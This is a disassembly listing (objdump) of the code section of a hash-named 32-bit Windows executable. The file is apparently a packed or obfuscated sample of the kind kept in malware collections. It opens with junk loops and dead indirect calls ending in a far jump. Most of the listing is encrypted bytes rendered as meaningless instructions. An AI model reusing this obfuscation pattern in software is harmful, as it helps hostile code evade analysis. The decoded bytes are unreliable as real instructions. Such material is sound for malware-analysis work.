
7ec0b59e19d618fd7ca56e6f6763b7f35485cdfb66719f85a7a5aad036f28676.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	adc    ecx,0x2570
  401012:	push   ebx
  401013:	adc    DWORD PTR ds:0x42a292,ecx
  401019:	push   esi
  40101a:	mov    DWORD PTR ds:0x42a266,0x13
  401024:	cmp    DWORD PTR ds:0x42a266,0x0
  40102b:	je     0x401065
  401031:	cmp    DWORD PTR ds:0x42a266,0x23
  401038:	ja     0x401065
  40103e:	jmp    0x401053
  401043:	push   0x42a28a
  401048:	push   0x4291e3
  40104d:	call   DWORD PTR ds:0x42a3f2
  401053:	mov    ecx,DWORD PTR ds:0x42a266
  401059:	dec    ecx
  40105a:	mov    DWORD PTR ds:0x42a266,ecx
  401060:	jmp    0x401024
  401065:	push   edi
  401066:	and    DWORD PTR ds:0x42a2b6,0x0
  401070:	mov    esi,DWORD PTR ds:0x42a2b6
  401076:	inc    esi
  401077:	mov    DWORD PTR ds:0x42a2b6,esi
  40107d:	cmp    DWORD PTR ds:0x42a2b6,0x4
  401084:	jg     0x4010ce
  40108a:	jmp    0x4010a5
  40108f:	push   0x5221
  401094:	push   0x42a2ce
  401099:	push   DWORD PTR [ebp-0x10]
  40109c:	push   DWORD PTR [ebp-0x14]
  40109f:	call   DWORD PTR ds:0x42a3f6
  4010a5:	cmp    DWORD PTR ds:0x42a2b6,0x3
  4010ac:	jne    0x4010c1
  4010b2:	xor    esi,esi
  4010b4:	or     esi,DWORD PTR ds:0x42a2b6
  4010ba:	inc    esi
  4010bb:	mov    DWORD PTR ds:0x42a2b6,esi
  4010c1:	cmp    DWORD PTR ds:0x42a2b6,0x15
  4010c8:	jb     0x401070
  4010ce:	mov    esi,0x75108aa
  4010d3:	mov    ecx,DWORD PTR ds:0x42a376
  4010d9:	mov    ecx,DWORD PTR [ecx]
  4010db:	add    DWORD PTR ds:0x42a256,ecx
  4010e1:	xor    eax,esi
  4010e3:	and    DWORD PTR ds:0x42a286,0x0
  4010ed:	mov    ecx,DWORD PTR ds:0x42a286
  4010f3:	inc    ecx
  4010f4:	mov    DWORD PTR ds:0x42a286,ecx
  4010fa:	cmp    DWORD PTR ds:0x42a286,0x1f
  401101:	jge    0x40112c
  401107:	jmp    0x40111f
  40110c:	push   DWORD PTR [ebp-0xc]
  40110f:	push   0x429231
  401114:	push   0x42916d
  401119:	call   DWORD PTR ds:0x42a3b6
  40111f:	cmp    DWORD PTR ds:0x42a286,0x1e
  401126:	jb     0x4010ed
  40112c:	mov    edi,0x3272f1
  401131:	add    eax,edi
  401133:	and    DWORD PTR ds:0x42a292,0x0
  40113d:	jmp    0x401151
  401142:	xor    ecx,ecx
  401144:	xor    ecx,DWORD PTR ds:0x42a292
  40114a:	inc    ecx
  40114b:	mov    DWORD PTR ds:0x42a292,ecx
  401151:	cmp    DWORD PTR ds:0x42a292,0x1e
  401158:	jae    0x40119f
  40115e:	cmp    DWORD PTR ds:0x42a292,0xe
  401165:	ja     0x40119f
  40116b:	jmp    0x40117e
  401170:	push   0x42916d
  401175:	push   DWORD PTR [ebp-0x18]
  401178:	call   DWORD PTR ds:0x42a3ba
  40117e:	cmp    DWORD PTR ds:0x42a292,0xd
  401185:	jne    0x40119a
  40118b:	xor    ecx,ecx
  40118d:	or     ecx,DWORD PTR ds:0x42a292
  401193:	inc    ecx
  401194:	mov    DWORD PTR ds:0x42a292,ecx
  40119a:	jmp    0x401142
  40119f:	mov    DWORD PTR [ebp-0x40],eax
  4011a2:	mov    eax,ds:0x42a2ca
  4011a7:	sbb    DWORD PTR ds:0x42a25a,eax
  4011ad:	mov    eax,ds:0x42929e
  4011b2:	sub    DWORD PTR ds:0x42a2fa,ecx
  4011b8:	mov    eax,DWORD PTR [eax]
  4011ba:	mov    DWORD PTR [ebp-0x3c],eax
  4011bd:	inc    eax
  4011be:	mov    eax,ds:0x4294ae
  4011c3:	and    DWORD PTR ds:0x42a26a,0x0
  4011cd:	jmp    0x4011df
  4011d2:	mov    ecx,DWORD PTR ds:0x42a26a
  4011d8:	inc    ecx
  4011d9:	mov    DWORD PTR ds:0x42a26a,ecx
  4011df:	cmp    DWORD PTR ds:0x42a26a,0x1f
  4011e6:	jae    0x401233
  4011ec:	cmp    DWORD PTR ds:0x42a26a,0x4
  4011f3:	jge    0x401233
  4011f9:	jmp    0x401214
  4011fe:	push   0x586f
  401203:	push   DWORD PTR [ebp-0x18]
  401206:	push   DWORD PTR [ebp-0x14]
  401209:	push   0x8d08
  40120e:	call   DWORD PTR ds:0x42a3be
  401214:	cmp    DWORD PTR ds:0x42a26a,0x3
  40121b:	jne    0x40122e
  401221:	mov    ecx,DWORD PTR ds:0x42a26a
  401227:	inc    ecx
  401228:	mov    DWORD PTR ds:0x42a26a,ecx
  40122e:	jmp    0x4011d2
  401233:	mov    eax,DWORD PTR [eax]
  401235:	add    ecx,0x507d
  40123b:	mov    DWORD PTR [ebp-0x1c],eax
  40123e:	xor    ecx,0x7815
  401244:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  40124b:	or     DWORD PTR ds:0x42a2da,0x4fa4
  401255:	mov    eax,DWORD PTR [ebp-0x34]
  401258:	xor    eax,esi
  40125a:	sub    ecx,DWORD PTR ds:0x42a2ce
  401260:	add    eax,edi
  401262:	and    DWORD PTR ds:0x42a266,edi
  401268:	mov    DWORD PTR [ebp-0x40],eax
  40126b:	mov    eax,ds:0x42941e
  401270:	jmp    0x403621
  401275:	retf   
  401276:	sbb    al,0x56
  401278:	or     eax,DWORD PTR [esi+0x409c8605]
  40127e:	sub    eax,0xfd850c0c
  401283:	idiv   DWORD PTR [eax-0x7d]
  401286:	add    DWORD PTR [ebx-0x7ca1107d],0xffffff83
  40128d:	and    al,0x2d
  40128f:	cmp    BYTE PTR es:[eax],ah
  401292:	xor    al,0x22
  401294:	cs je  0x4012d4
  401297:	jo     0x401310
  401299:	jnp    0x401312
  40129b:	jae    0x401310
  40129d:	ins    BYTE PTR es:[edi],dx
  40129e:	dec    ebx
  40129f:	aam    0xdd
  4012a1:	clc    
  4012a2:	imul   edx,DWORD PTR [ecx+0x72],0x79a96278
  4012a9:	ins    BYTE PTR es:[edi],dx
  4012aa:	pusha  
  4012ab:	into   
  4012ac:	pop    esp
  4012ad:	push   ebx
  4012ae:	cmp    DWORD PTR [ebp+0x66879603],ecx
  4012b4:	dec    esp
  4012b5:	jle    0x4012fd
  4012b7:	mov    DWORD PTR [edi+0x42bbb97e],esi
  4012bd:	sub    eax,0x3dd77fe
  4012c2:	push   0x7e
  4012c4:	pop    ds
  4012c5:	in     al,dx
  4012c6:	inc    eax
  4012c7:	int3   
  4012c8:	ret    
  4012c9:	in     al,dx
  4012ca:	xchg   esi,eax
  4012cb:	sub    bl,bh
  4012cd:	xchg   edx,eax
  4012ce:	xor    BYTE PTR [esi],cl
  4012d0:	pusha  
  4012d1:	mov    dl,0x93
  4012d3:	aad    0x6
  4012d5:	ins    BYTE PTR es:[edi],dx
  4012d6:	fcom   QWORD PTR ds:0x37030fe5
  4012dc:	and    DWORD PTR [ecx+0xd],edx
  4012df:	aaa    
  4012e0:	jb     0x401353
  4012e2:	shr    BYTE PTR [esi-0x48eba7d6],0xfe
  4012e9:	lock push eax
  4012eb:	xor    al,BYTE PTR [ebp+0x62d14b]
  4012f1:	and    eax,DWORD PTR [ebx]
  4012f3:	cmp    DWORD PTR [eax+0x5ea1dc7a],0x2516b892
  4012fd:	fwait
  4012fe:	dec    eax
  4012ff:	or     bl,BYTE PTR [edi+0x128a8b3d]
  401305:	jecxz  0x401333
  401307:	imul   ecx,DWORD PTR [ebp+eax*2-0x31059ab6],0xffffff93
  40130f:	xor    BYTE PTR [eax-0x6e323937],dl
  401315:	push   0x4d6b54f5
  40131a:	or     eax,0x1a470a3f
  40131f:	lods   al,BYTE PTR ds:[esi]
  401320:	push   edx
  401321:	shl    DWORD PTR [esi+0x6715d949],cl
  401327:	cld    
  401328:	imul   esp,DWORD PTR [edi-0x4c],0x0
  40132c:	jno    0x4012ec
  40132e:	add    DWORD PTR [ebx+0x21],ebx
  401331:	test   dl,bl
  401333:	pop    esp
  401334:	loope  0x401337
  401336:	adc    cl,bh
  401338:	nop    DWORD PTR [ecx]
  40133b:	or     al,0x11
  40133d:	push   edx
  40133e:	ins    DWORD PTR es:[edi],dx
  40133f:	or     al,0xf5
  401341:	dec    edi
  401342:	mov    BYTE PTR cs:[edx+0x7546f90b],0xca
  40134a:	pusha  
  40134b:	inc    eax
  40134c:	fcomp  DWORD PTR [esi-0x70713f6b]
  401352:	cmp    DWORD PTR [edi+0x44],esi
  401355:	add    al,0x26
  401357:	ret    
  401358:	int3   
  401359:	inc    ecx
  40135a:	mov    DWORD PTR [ebp+0x3d],ebx
  40135d:	jecxz  0x401382
  40135f:	xchg   BYTE PTR [ebx-0x11a98486],dl
  401365:	cmp    ah,bh
  401367:	mov    dh,0x10
  401369:	sbb    al,0xa4
  40136b:	mov    DWORD PTR ss:[edx],ecx
  40136e:	dec    ebp
  40136f:	les    ebx,FWORD PTR [eax]
  401371:	arpl   cx,dx
  401373:	stc    
  401374:	push   0x47895fb8
  401379:	jle    0x401386
  40137b:	mov    bh,BYTE PTR [edi]
  40137d:	cmp    eax,0x40a58464
  401382:	inc    edx
  401383:	mov    dl,BYTE PTR [esi+0x3d8d57b0]
  401389:	dec    ebp
  40138a:	fwait
  40138b:	gs jbe 0x401329
  40138e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40138f:	repz pop fs
  401392:	and    cl,BYTE PTR [eax-0x6d]
  401395:	add    DWORD PTR ds:0x79367e7e,ebx
  40139b:	dec    edx
  40139c:	push   0x57
  40139e:	cmp    DWORD PTR [edx-0x15],esi
  4013a1:	cmp    eax,0x901c54ff
  4013a6:	adc    ch,BYTE PTR [edx]
  4013a8:	cmp    eax,0x6d6a980d
  4013ad:	es mov al,0x29
  4013b0:	and    edi,DWORD PTR [esi+0x1c]
  4013b3:	outs   dx,DWORD PTR ds:[esi]
  4013b4:	out    0x13,eax
  4013b6:	jmp    0xc8abf96b
  4013bb:	cld    
  4013bc:	sub    DWORD PTR [esi+0x8],ebp
  4013bf:	xchg   ebx,eax
  4013c0:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013c2:	xor    BYTE PTR [ecx+0x1b],al
  4013c5:	mov    ecx,0x9404e670
  4013ca:	dec    esp
  4013cb:	sbb    al,0xd3
  4013cd:	adc    al,0x27
  4013cf:	inc    eax
  4013d0:	sti    
  4013d1:	push   edx
  4013d2:	sbb    BYTE PTR [eax-0x3a1d032f],dh
  4013d8:	pop    ss
  4013d9:	out    dx,eax
  4013da:	(bad)  
  4013db:	pop    edx
  4013dc:	in     al,dx
  4013dd:	shr    BYTE PTR [eax-0x69],cl
  4013e0:	push   eax
  4013e1:	popa   
  4013e2:	push   edi
  4013e3:	aad    0x63
  4013e5:	mov    WORD PTR [esi-0x63b0bb02],?
  4013eb:	sub    dl,BYTE PTR [edx]
  4013ed:	repnz stos BYTE PTR es:[edi],al
  4013ef:	das    
  4013f0:	xlat   BYTE PTR ds:[ebx]
  4013f1:	mov    dh,0xd4
  4013f3:	dec    edx
  4013f4:	push   eax
  4013f5:	fmulp  st(6),st
  4013f7:	push   ebx
  4013f8:	add    esi,DWORD PTR ss:[ecx+0x2e]
  4013fc:	mov    bl,0xd6
  4013fe:	(bad)  
  401400:	pushf  
  401401:	loopne 0x40142a
  401403:	pop    esp
  401404:	hlt    
  401405:	adc    DWORD PTR [eax],eax
  401407:	xchg   ecx,eax
  401408:	mov    edx,0x6852da95
  40140d:	push   0xffafac8a
  401412:	into   
  401413:	inc    esp
  401414:	or     esi,DWORD PTR [esi-0x19407ba9]
  40141a:	cmp    BYTE PTR [ebp-0x50a472e3],bh
  401420:	(bad)  
  401421:	(bad)  
  401423:	xchg   ebp,eax
  401424:	push   es
  401425:	cmc    
  401426:	fstp   TBYTE PTR [edx+0x78520368]
  40142c:	cdq    
  40142d:	mov    bh,0x81
  40142f:	out    dx,eax
  401430:	dec    esi
  401431:	mov    es,edi
  401433:	sar    DWORD PTR [eax+0x3e8b5c3],1
  401439:	lahf   
  40143a:	adc    BYTE PTR [esi+0x35],ah
  40143d:	out    0xd1,al
  40143f:	in     eax,0xe1
  401441:	std    
  401442:	adc    BYTE PTR [esi-0x24],0x4f
  401446:	lock hlt 
  401448:	mov    edi,0x7fc34433
  40144d:	repnz and al,0xc3
  401451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401452:	sbb    eax,DWORD PTR [eax+0x437db05a]
  401458:	ja     0x40144b
  40145a:	aad    0x2a
  40145c:	pop    es
  40145d:	xchg   ebx,eax
  40145e:	loop   0x401499
  401460:	mov    ds,WORD PTR fs:[esp+edx*2+0x6a]
  401465:	mov    ch,0xa2
  401467:	cmp    eax,0xfb044f01
  40146c:	test   BYTE PTR [ecx+0xa607a42],cl
  401472:	(bad)  
  401473:	xor    al,0x50
  401475:	jmp    0x59f0:0x4a7cf8ce
  40147c:	(bad)  
  40147d:	fisub  DWORD PTR [eax+0x7]
  401480:	adc    DWORD PTR [ecx],0xffffff9c
  401483:	add    esp,DWORD PTR [esi-0x7c]
  401486:	mov    dl,BYTE PTR [ecx+edi*4+0x61405c73]
  40148d:	outs   dx,DWORD PTR ds:[esi]
  40148e:	rol    BYTE PTR [edi+0x11],cl
  401491:	mov    ecx,0xf9541901
  401496:	sbb    eax,0x21cfde73
  40149b:	(bad)  
  40149c:	sub    esp,eax
  40149e:	or     esi,DWORD PTR [edx]
  4014a0:	xor    esi,DWORD PTR [ecx]
  4014a2:	int    0xf0
  4014a4:	push   edx
  4014a5:	cmp    al,dl
  4014a7:	fwait
  4014a8:	test   BYTE PTR [ebp+0x15],ah
  4014ab:	dec    esi
  4014ac:	add    eax,0xd911d5c8
  4014b1:	ins    BYTE PTR es:[edi],dx
  4014b2:	push   ebp
  4014b3:	pop    esi
  4014b4:	jne    0x401445
  4014b6:	sbb    eax,0xbc716d9a
  4014bb:	int3   
  4014bc:	shl    DWORD PTR [ecx],0x14
  4014bf:	popa   
  4014c0:	mov    cl,0xe7
  4014c2:	je     0x4014c1
  4014c4:	pop    es
  4014c5:	sub    al,0x6c
  4014c7:	dec    edi
  4014c8:	sbb    eax,0x97a933b0
  4014cd:	inc    ebp
  4014ce:	adc    ah,BYTE PTR [esi+eiz*8+0x5b]
  4014d2:	(bad)  
  4014d4:	fcmovnbe st,st(2)
  4014d6:	inc    ebp
  4014d7:	push   ebx
  4014d8:	mov    DWORD PTR [ecx+0x30],ebx
  4014db:	dec    ecx
  4014dc:	jmp    0x9373:0x220991ca
  4014e3:	and    eax,0x41b7d5dc
  4014e8:	and    bh,BYTE PTR [edi+edx*4]
  4014eb:	or     DWORD PTR [edx-0x645ca3d8],ecx
  4014f1:	push   ds
  4014f2:	loope  0x4014f0
  4014f4:	stc    
  4014f5:	std    
  4014f6:	push   edi
  4014f7:	mov    ch,0xf6
  4014f9:	push   cs
  4014fa:	lock mov ds:0x4d562051,al
  401500:	jg     0x40154b
  401502:	push   ecx
  401503:	xchg   edi,eax
  401504:	nop
  401505:	aam    0xd2
  401507:	ds arpl ax,di
  40150a:	repz jae 0x4014b4
  40150d:	adc    eax,0x85d95c
  401512:	or     eax,0xaa68b219
  401517:	stos   BYTE PTR es:[edi],al
  401518:	shld   DWORD PTR [eax],esi,0x43
  40151c:	fldcw  WORD PTR [edx]
  40151e:	mov    bl,BYTE PTR [ebx]
  401520:	mov    al,0xc8
  401522:	retf   
  401523:	fisttp WORD PTR [edi-0x2d]
  401526:	cmovo  edx,DWORD PTR [ecx+edx*2+0x65bb404e]
  40152e:	nop
  40152f:	jl     0x4014ce
  401531:	pop    es
  401532:	mov    edi,0x55fe7294
  401537:	ja     0x401581
  401539:	fstp   TBYTE PTR [ebx+0xc]
  40153c:	jae    0x40156e
  40153e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40153f:	jge    0x40156a
  401541:	dec    esi
  401542:	cmp    dh,BYTE PTR [edi+ebp*2+0x1f94357]
  401549:	cmp    DWORD PTR [esi+ebp*2+0x35778122],eax
  401550:	jno    0x401541
  401552:	adc    al,0x88
  401554:	mov    dl,dl
  401556:	inc    ecx
  401557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401558:	fwait
  401559:	je     0x4014f8
  40155b:	mov    ds:0xb2c37767,eax
  401560:	ret    0x7111
  401563:	xor    DWORD PTR [edi],edi
  401565:	mov    ah,0xaa
  401567:	xor    DWORD PTR [ebx+0x121c2480],esi
  40156d:	fwait
  40156e:	pop    ebp
  40156f:	lods   eax,DWORD PTR ds:[esi]
  401570:	test   BYTE PTR [esi+0x59],bl
  401573:	out    dx,al
  401574:	dec    edi
  401575:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401576:	popa   
  401577:	fisttp QWORD PTR [edi]
  401579:	dec    edi
  40157a:	adc    al,0x93
  40157c:	mov    eax,ds:0x15330b58
  401581:	push   es
  401582:	xchg   ecx,eax
  401583:	iret   
  401584:	mov    ch,0xe4
  401586:	cmc    
  401587:	mov    esp,0x4eb8fcc
  40158c:	icebp  
  40158d:	clc    
  40158e:	mov    esi,0x7f3ed4e5
  401593:	iret   
  401594:	xchg   BYTE PTR [ebx-0x7152c8b4],dl
  40159a:	mov    bh,0x66
  40159c:	adc    ebx,DWORD PTR [eax+0x77]
  40159f:	pop    ebp
  4015a0:	nop    DWORD PTR [ebx]
  4015a3:	in     al,0xcf
  4015a5:	and    eax,0xa1b97f39
  4015aa:	icebp  
  4015ab:	outs   dx,DWORD PTR ds:[esi]
  4015ac:	sub    al,0x27
  4015ae:	scas   eax,DWORD PTR es:[edi]
  4015af:	jns    0x401571
  4015b1:	pop    ebp
  4015b2:	mov    esi,0x2fcbc2ad
  4015b7:	xor    dh,ch
  4015b9:	fnstenv [edi+0x57]
  4015bc:	mov    bh,0x27
  4015be:	jp     0x40158b
  4015c0:	sub    esp,ebx
  4015c2:	mov    ah,0x89
  4015c4:	sub    dh,BYTE PTR [eax]
  4015c6:	jmp    0x75b2f887
  4015cb:	cmp    al,0xb5
  4015cd:	ins    BYTE PTR es:[edi],dx
  4015ce:	cmp    al,0x39
  4015d0:	(bad)  
  4015d1:	sub    eax,0x4228aba2
  4015d6:	and    al,0xbf
  4015d8:	fst    QWORD PTR [edi]
  4015da:	and    edi,ebx
  4015dc:	pop    ds
  4015dd:	dec    esp
  4015de:	inc    edx
  4015df:	pushf  
  4015e0:	leave  
  4015e1:	mov    ch,0xb5
  4015e3:	xor    eax,0xc172ef98
  4015e8:	cs retf 0x42b1
  4015ec:	dec    ebp
  4015ed:	repz stc 
  4015ef:	in     al,0x16
  4015f1:	div    DWORD PTR [esi+esi*1]
  4015f4:	jmp    0x1c5827a7
  4015f9:	fbstp  TBYTE PTR [edx+0x74]
  4015fc:	cli    
  4015fd:	lods   al,BYTE PTR ds:[esi]
  4015fe:	ss xchg edx,esp
  401601:	mov    ecx,0x2b362589
  401606:	mov    edx,0xb8e0ebf1
  40160b:	sub    eax,0xf2713134
  401610:	out    dx,al
  401611:	neg    edi
  401613:	and    DWORD PTR [edi-0x64],ebp
  401616:	in     al,dx
  401617:	clc    
  401618:	jo     0x40166d
  40161a:	mov    ch,BYTE PTR [eax+0x9094a7b]
  401620:	cdq    
  401621:	enter  0x1726,0x11
  401625:	jecxz  0x401660
  401627:	xchg   DWORD PTR ds:0xa500bc94,esp
  40162d:	js     0x40169f
  40162f:	cmp    BYTE PTR [edi+0x139432],0xd5
  401636:	jo     0x401674
  401638:	not    DWORD PTR ds:0x4c80ced1
  40163e:	adc    ch,BYTE PTR [edi-0x5c41c488]
  401644:	(bad)  
  401646:	stos   BYTE PTR es:[edi],al
  401647:	xor    BYTE PTR [edx-0x3],bl
  40164a:	jmp    0x401655
  40164c:	cmp    eax,0xea7536d2
  401651:	add    ch,BYTE PTR [ebp-0x54]
  401654:	addr16 retf 0xe121
  401658:	mov    ebx,0xc06e94e6
  40165d:	mov    al,0xc9
  40165f:	fwait
  401660:	xor    BYTE PTR [ecx-0x4f],ch
  401663:	fst    QWORD PTR [esi+0x9]
  401666:	cwde   
  401667:	sub    eax,0x7a467a9d
  40166c:	adc    ah,BYTE PTR [esi-0x5c]
  40166f:	cmp    dh,BYTE PTR [eax]
  401671:	xor    eax,DWORD PTR [ebx]
  401673:	std    
  401674:	sub    eax,0x6004fbfd
  401679:	mov    bh,BYTE PTR [esi-0x56]
  40167c:	jle    0x40166b
  40167e:	fist   WORD PTR [ebx+0xec3650]
  401684:	sub    ah,BYTE PTR [esi]
  401686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401688:	and    esi,DWORD PTR [esi-0x66]
  40168b:	adc    BYTE PTR fs:[ecx-0x6baa6229],ch
  401692:	push   edi
  401693:	imul   eax,esi,0xffffffc9
  401696:	rol    BYTE PTR [ebp+0xa],cl
  401699:	mov    esi,0x5c9bb260
  40169e:	aas    
  40169f:	and    esp,DWORD PTR [edi]
  4016a1:	mov    ecx,0x447054b8
  4016a6:	push   cs
  4016a7:	test   edi,ebx
  4016a9:	test   al,0xe7
  4016ab:	mov    cl,0xaa
  4016ad:	mov    edx,0xf9508f96
  4016b2:	add    DWORD PTR [edi-0x618943aa],0xffffffb8
  4016b9:	ss call 0x85ee:0xecdab759
  4016c1:	xchg   edi,eax
  4016c2:	push   0x555fd557
  4016c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016c8:	hlt    
  4016c9:	sub    al,0xe6
  4016cb:	pop    eax
  4016cc:	dec    esi
  4016cd:	xchg   edx,edi
  4016cf:	inc    edx
  4016d0:	jl     0x40168b
  4016d2:	(bad)  
  4016d3:	sub    ebp,DWORD PTR [edi-0x74]
  4016d6:	adc    DWORD PTR [edx+0x6d4d5cc2],edx
  4016dc:	(bad)  
  4016dd:	push   eax
  4016de:	cdq    
  4016df:	mov    al,0x94
  4016e1:	sub    DWORD PTR [edx-0x31a2818f],ebp
  4016e7:	clc    
  4016e8:	xor    BYTE PTR ds:0x7a3bdb04,ah
  4016ee:	add    al,0xcd
  4016f0:	(bad)
  4016f3:	stc    
  4016f4:	and    bh,dh
  4016f6:	ror    DWORD PTR [esi-0x3de150e4],cl
  4016fc:	pushf  
  4016fd:	push   edi
  4016fe:	jae    0x40168d
  401700:	inc    esi
  401701:	jb     0x401735
  401703:	outs   dx,DWORD PTR ds:[esi]
  401704:	jb     0x40175a
  401706:	sub    eax,0x55d951f7
  40170b:	jecxz  0x4016ad
  40170d:	jle    0x4016a6
  40170f:	repz int 0xda
  401712:	push   edx
  401713:	inc    esp
  401714:	dec    esi
  401715:	imul   eax,edi,0x58c5cc7b
  40171b:	xchg   edx,eax
  40171c:	or     esi,eax
  40171e:	fcomp  QWORD PTR [ecx+0x39fd5f7c]
  401724:	and    DWORD PTR [eax-0xf],eax
  401727:	adc    eax,DWORD PTR [esi]
  401729:	arpl   WORD PTR [ebx+0x7226b792],cx
  40172f:	jo     0x4017ab
  401731:	imul   ebp,DWORD PTR [ecx],0x5c
  401734:	or     dl,BYTE PTR [ecx+0x37]
  401737:	clc    
  401738:	cmp    DWORD PTR [ebx+edx*1],edx
  40173b:	mov    ebx,0xdb6f9a21
  401740:	in     al,0xdc
  401742:	push   ds
  401743:	sbb    BYTE PTR [ecx-0x544d17f5],0xb1
  40174a:	mov    DWORD PTR [ebx-0xefa6e09],ebp
  401750:	(bad)  
  401751:	clc    
  401752:	fistp  QWORD PTR [esi+0x67bd0116]
  401758:	cmp    eax,0x71880ca8
  40175d:	or     BYTE PTR ds:0xf1f654ce,cl
  401763:	in     al,dx
  401764:	inc    edx
  401765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401766:	or     esp,DWORD PTR [eax-0x24]
  401769:	imul   ebx,esp,0xdec45760
  40176f:	aad    0xdb
  401771:	xor    dh,BYTE PTR [edi]
  401773:	pop    ecx
  401774:	ror    BYTE PTR [esp+edi*4+0x36],1
  401778:	jecxz  0x401720
  40177a:	in     eax,0xcb
  40177c:	mov    DWORD PTR [edx+0x31],esp
  40177f:	and    edi,DWORD PTR [ebx+edi*4-0x57]
  401783:	inc    ecx
  401784:	jg     0x40174f
  401786:	repnz pop ss
  401788:	inc    eax
  401789:	inc    edi
  40178a:	cmp    dh,BYTE PTR [ecx]
  40178c:	rol    DWORD PTR [edi],cl
  40178e:	and    BYTE PTR [esp+ebp*4-0x4a],bl
  401792:	cmp    DWORD PTR [ebx+0x25],0x20
  401796:	fisttp QWORD PTR [ebx-0x6e1a0dc0]
  40179c:	out    0xff,al
  40179e:	into   
  40179f:	scas   eax,DWORD PTR es:[edi]
  4017a0:	test   DWORD PTR [edx-0x440d0b77],ebp
  4017a6:	aaa    
  4017a7:	enter  0x2bb9,0xa
  4017ab:	shl    DWORD PTR [ecx],cl
  4017ad:	(bad)  
  4017ae:	xor    eax,0x283e4782
  4017b3:	jns    0x401808
  4017b5:	cmp    al,0x79
  4017b7:	push   esi
  4017b8:	push   cs
  4017b9:	sbb    edi,ebx
  4017bb:	pusha  
  4017bc:	out    0xb6,al
  4017be:	dec    DWORD PTR [esi]
  4017c0:	in     al,dx
  4017c1:	inc    esi
  4017c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017c3:	pop    edx
  4017c4:	pop    ds
  4017c5:	add    eax,0xce4c5cfc
  4017ca:	icebp  
  4017cb:	enter  0x8e78,0x40
  4017cf:	nop
  4017d0:	or     ch,BYTE PTR [edi+0x2a]
  4017d3:	mov    dl,0xc7
  4017d5:	pusha  
  4017d6:	in     al,dx
  4017d7:	inc    eax
  4017d8:	push   edi
  4017d9:	add    bl,bl
  4017db:	sahf   
  4017dc:	push   0x4f
  4017de:	push   ecx
  4017df:	add    al,0x5d
  4017e1:	inc    ebx
  4017e2:	mov    eax,ds:0xb9d1511a
  4017e7:	bound  eax,QWORD PTR [eax]
  4017e9:	ds and al,0xbf
  4017ec:	inc    edi
  4017ed:	les    ecx,FWORD PTR [esi]
  4017ef:	cmc    
  4017f0:	(bad)  [ebp-0x58ee617a]
  4017f6:	fild   QWORD PTR [edx-0x4f72c694]
  4017fc:	push   0x643536c0
  401801:	mov    al,0xc2
  401803:	mov    ecx,0x70f16397
  401808:	or     edi,esp
  40180a:	push   edx
  40180b:	js     0x4017ea
  40180d:	xor    esp,DWORD PTR [edx]
  40180f:	jge    0x4017fd
  401811:	mov    ecx,DWORD PTR [eax+0x7d]
  401814:	lods   al,BYTE PTR ds:[esi]
  401815:	fstp   QWORD PTR [ebx]
  401817:	out    0xad,al
  401819:	(bad)
  40181c:	jno    0x40180e
  40181e:	dec    edi
  40181f:	xchg   esp,eax
  401820:	pop    ss
  401821:	aas    
  401822:	pop    esp
  401823:	adc    edi,ecx
  401825:	mov    ch,0xfc
  401827:	retf   0xd0a1
  40182a:	mul    DWORD PTR [edi]
  40182c:	fwait
  40182d:	(bad)  
  40182e:	ins    DWORD PTR es:[edi],dx
  40182f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401830:	out    dx,al
  401831:	ret    0x4b97
  401834:	(bad)  
  401835:	dec    edx
  401836:	adc    edx,DWORD PTR [eax-0x31]
  401839:	mov    ds:0x66891487,al
  40183e:	jae    0x40182d
  401840:	test   eax,0xb374bf9
  401845:	neg    BYTE PTR [eax-0x2b]
  401848:	mov    esp,0xf4eb4339
  40184d:	push   ebx
  40184e:	cmp    edx,DWORD PTR [ebx-0x23]
  401851:	pop    es
  401852:	in     al,dx
  401853:	leave  
  401854:	sti    
  401855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401856:	aad    0xdb
  401858:	jno    0x4018ce
  40185a:	lock std 
  40185c:	(bad)  
  40185d:	or     DWORD PTR [edi-0x80],ecx
  401860:	or     al,0x87
  401862:	mul    dl
  401864:	jmp    0x219dd588
  401869:	fwait
  40186a:	push   ebp
  40186b:	je     0x4018eb
  40186d:	mov    esp,0xda161775
  401872:	shr    esp,cl
  401874:	lds    ecx,FWORD PTR [esi+edx*8]
  401877:	outs   dx,DWORD PTR ds:[esi]
  401878:	mov    ah,0x84
  40187a:	(bad)  
  40187b:	icebp  
  40187c:	pop    edx
  40187d:	sub    DWORD PTR [edi+0x64],ebx
  401880:	adc    ebx,DWORD PTR [edi+eax*1-0x37]
  401884:	push   edx
  401885:	int3   
  401886:	jg     0x401847
  401888:	xchg   ebp,eax
  401889:	push   ss
  40188a:	test   BYTE PTR [ebx+0x29],al
  40188d:	aad    0x7
  40188f:	(bad)  
  401890:	push   edi
  401891:	(bad)  
  401893:	add    cl,BYTE PTR [edx]
  401895:	out    0x3a,al
  401897:	fs xchg ebp,eax
  401899:	push   esp
  40189a:	push   esp
  40189b:	and    al,0x52
  40189d:	daa    
  40189e:	mov    eax,ds:0x392b2211
  4018a3:	fldl2t 
  4018a5:	cmp    dh,cl
  4018a7:	pop    eax
  4018a8:	popa   
  4018a9:	dec    ebx
  4018aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018ab:	jmp    0x79a2:0xd56d8bf7
  4018b2:	add    BYTE PTR [ecx+0x49],bl
  4018b5:	sbb    DWORD PTR [ebx],edx
  4018b7:	scas   al,BYTE PTR es:[edi]
  4018b8:	rol    esi,1
  4018ba:	sbb    al,0x3f
  4018bc:	sub    DWORD PTR [ecx+0x6ca543e3],eax
  4018c2:	not    BYTE PTR [edx+0x71118783]
